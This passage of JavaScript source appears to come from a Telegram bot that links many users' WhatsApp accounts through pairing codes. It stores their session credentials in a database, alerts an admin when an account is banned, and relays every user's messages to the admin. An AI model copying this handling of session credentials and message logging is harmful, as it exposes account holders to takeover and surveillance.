                const disconnectStatus = isBanned ? '[BANNED / BLOCKED]' : '[LOGGED OUT / BAD SESSION]';

                const alertMessage = 
                    `**[ACCOUNT LOST]**\n\n` +
                    `**Number:** +${phoneNumber}\n` +
                    `**Status:** ${disconnectStatus}\n` +
                    `**Session ID:** \`${cachedShortId}\`\n\n` +
                    `*Session data has been wiped from the server.*`;

                try {
                    await mainBot.sendMessage(ADMIN_ID, alertMessage, { parse_mode: 'Markdown' });
                } catch (err) {
                    console.error("Failed to send instant disconnect alert:", err.message);
                }

                try { await deductOnDisconnect(folder); } catch(e) {}
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];

            } else {
                willRestart = true;
                console.log(`[RECONNECT] Attempting restart for ${cachedShortId}. Reason: ${reason}`);
                startClient(folder, null, chatId, telegramUserId);
            }
            
            if (!willRestart) {
                if (clients[folder]) delete clients[folder]; 
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;

                if (typeof pairingCallback === 'function') {
                    pairingCallback(formattedCode);
                }

                if (chatId) {
                    mainBot.sendMessage(chatId, 
                        `[PAIRING CODE GENERATED]\n\n` +
                        `Your code is: **${formattedCode}**\n\n` +
                        `Tap the button below to copy the code, then open the WhatsApp notification on your phone to link the device.`, 
                        { 
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: `Copy Code: ${code}`, copy_text: { text: code } }],
                                    [{ text: `Regenerate Code`, callback_data: `regen_pair_${targetNumber}` }]
                                ]
                            }
                        }
                    );
                }
            } catch (e) {
                console.error("Pairing Error:", e);
                
                if (typeof pairingCallback === 'function') {
                    pairingCallback(null, e); 
                }

                if (chatId) mainBot.sendMessage(chatId, `[ERROR] Failed to request pairing code: ${e.message}`);
            }
        }, 3000);
    }
}

mainBot.on('message', async (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId === ADMIN_ID || (SUBADMIN_IDS || []).includes(chatId)) return;

    const username = msg.from.username ? `@${msg.from.username}` : (msg.from.first_name || 'Unknown');
    
    let rawText = msg.text || '[Sent a file or media]';
    const cleanText = rawText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&'); 
    
    const now = Date.now();
    const fifteenMinutes = 15 * 60 * 1000;

    if (userAlertCache[chatId] && (now - userAlertCache[chatId].lastTime < fifteenMinutes)) {
        
        userAlertCache[chatId].history += `\n- ${cleanText}`;
        userAlertCache[chatId].lastTime = now; 

        const alertMsg = 
            `[USER INTERACTION - ACTIVE]\n` +
            `User: ${username}\n` +
            `ID: \`${chatId}\`\n\n` +
            `Activity Log:\n${userAlertCache[chatId].history}`;
            
        try {
            await notificationBot.editMessageText(alertMsg, { 
                chat_id: ADMIN_ID, 
                message_id: userAlertCache[chatId].messageId,
                parse_mode: 'Markdown' 
            });
        } catch (e) {
        }

    } else {
        
        const historyStr = `- ${cleanText}`;
        const alertMsg = 
            `[USER INTERACTION]\n` +
            `User: ${username}\n` +
            `ID: \`${chatId}\`\n\n` +
            `Activity Log:\n${historyStr}`;
            
        try {
            const sentMsg = await notificationBot.sendMessage(ADMIN_ID, alertMsg, { parse_mode: 'Markdown' });
            
            userAlertCache[chatId] = {
                messageId: sentMsg.message_id,
                lastTime: now,
                history: historyStr
            };
        } catch (e) {
        }
    }
});

async function boot() {
    await initDb(); 

    await initUserBot(clients);
    
    setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount, startMobileRegistration);

    const savedSessions = await getAllSessions(null);
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { 
            folder: session.session_id, 
            phone: session.phone, 
            chatId: session.telegram_user_id, 
            connectedAt: new Date(session.connected_at) 
        };
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        startClient(session.session_id, null, null, session.telegram_user_id);
    }


    // Run the Zambia Sync every 1 hour
setInterval(() => {
    syncZambiaWithChat();
}, 3600000); // Syncs and saves every 1 hour


    setInterval(() => {
        syncDatabaseWithChat().catch(e => console.error("[SYNC FATAL]", e.message));
    }, 1800000);

    console.log(`[BOOT] Server ready`);
}

boot().catch(err => {
    console.error('[BOOT] Error:', err.message);
});
